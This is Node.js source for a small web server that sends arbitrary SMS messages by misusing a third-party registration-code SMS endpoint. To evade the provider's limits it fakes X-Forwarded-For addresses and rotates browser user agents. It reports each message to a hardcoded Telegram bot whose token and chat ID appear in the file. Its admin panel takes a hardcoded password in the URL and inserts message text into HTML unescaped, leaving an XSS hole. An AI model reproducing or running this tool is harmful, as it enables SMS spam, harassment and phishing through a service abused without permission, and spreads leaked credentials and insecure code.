const express = require('express');
const axios = require('axios');
const app = express();
const fs = require('fs');

app.use(express.json());
app.use(express.urlencoded({ extended: true })); // To parse URL-encoded bodies

// Configuration 
let MAX_MESSAGES = 500;
const AUTH_TOKEN = 'YOUR_ACTUAL_AUTH_TOKEN'; // Replace with your real token
const SMS_API_URL = 'http://202.51.182.198:8181/nbp/sms/code';
const TELEGRAM_BOT_TOKEN = '7404527625:AAFEML9zNEOeba3eSnN62x0ESuy2nn1H-4k'; // Replace with your bot token
const TELEGRAM_CHAT_ID = '-1002198268533'; // Replace with your chat ID

let messageCount = 0;
const sentMessages = [];

// Admin Authentication (replace with a more secure method)
const ADMIN_PASSWORD = 'GAJARBOTOL'; // CHANGE THIS!

// --- Helper Functions ---
function getRandomUserAgent() {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function generateRandomIP() {
    const parts = [];
    for (let i = 0; i < 4; i++) {
        parts.push(Math.floor(Math.random() * 255) + 1); // 1-254
    }
    return parts.join('.');
}

function addWatermark(text) {
    return `${text} \ndev: gajarbotolx.t.me`;
}

async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    };

    try {
        await axios.post(url, data);
    } catch (error) {
        console.error('Error sending Telegram message:', error);
    }
}

// --- Admin Panel Routes ---
app.get('/admin', (req, res) => {
    const password = req.query.password;
    if (password !== ADMIN_PASSWORD) {
        return res.status(401).send('Unauthorized');
    }

    const messagesHtml = sentMessages.map((msg, i) => 
        `<li>${i + 1}. ${msg.timestamp} - ${msg.receiver}: ${msg.text}</li>`
    ).join('');

    res.send(`
        <h1>Admin Panel</h1>
        <form method="post" action="/admin/set-limit">
            <label for="limit">New Message Limit:</label>
            <input type="number" id="limit" name="limit" value="${MAX_MESSAGES}">
            <input type="hidden" name="password" value="${ADMIN_PASSWORD}">
            <button type="submit">Set Limit</button>
        </form>
        <h2>Sent Messages</h2>
        <ul>${messagesHtml}</ul>
    `);
});

app.post('/admin/set-limit', (req, res) => {
    const password = req.body.password;
    if (password !== ADMIN_PASSWORD) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    const newLimit = parseInt(req.body.limit);
    if (isNaN(newLimit) || newLimit <= 0) {
        return res.status(400).json({ error: 'Invalid limit' });
    }

    MAX_MESSAGES = newLimit;
    res.json({ message: `Message limit updated to ${MAX_MESSAGES}` });
});

// --- SMS Sending Route ---
app.get('/send_sms', async (req, res) => {
    if (messageCount >= MAX_MESSAGES) {
        return res.status(429).json({ error: 'Message limit reached' });
    }

    const { receiver, text } = req.query;
    if (!receiver || !text) {
        return res.status(400).json({ error: 'Missing receiver or text parameters' });
    }

    const headers = {
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'language': 'en',
        'timeZone': 'Asia/Dhaka',
        'Content-Type': 'application/json',
        'Host': '202.51.182.198:8181',
        'Connection': 'Keep-Alive',
        'User-Agent': getRandomUserAgent(),
        'X-Forwarded-For': generateRandomIP(),
    };

    const data = {
        'receiver': receiver,
        'text': addWatermark(text), // Add watermark here
        'title': 'Register Account', // Customize as needed
    };

    try {
        const response = await axios.post(SMS_API_URL, data, { headers });
        if (response.data.msg_code === "request.over.max.count") {
            return res.status(500).json({ error: 'Failed to send SMS: Over max count' });
        }

        messageCount++;
        const sentMessage = { receiver, text: data.text, timestamp: new Date().toLocaleString() };
        sentMessages.push(sentMessage);

        fs.appendFileSync('sms_log.txt', `${sentMessage.timestamp}: ${receiver} - ${data.text}\n`);

        const notificationMessage = `SMS sent successfully!\nReceiver: ${receiver}\nText: ${data.text}\nIP: ${headers['X-Forwarded-For']}\nUser-Agent: ${headers['User-Agent']}`;
        await sendTelegramMessage(notificationMessage);

        res.json({ message: 'SMS sent successfully!' });
    } catch (error) {
        console.error("Error sending SMS:", error);
        res.status(500).json({ error: 'Failed to send SMS' });
    }
});

// --@ Server Start ---
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`SMS server listening at http://localhost:${port}`);
});
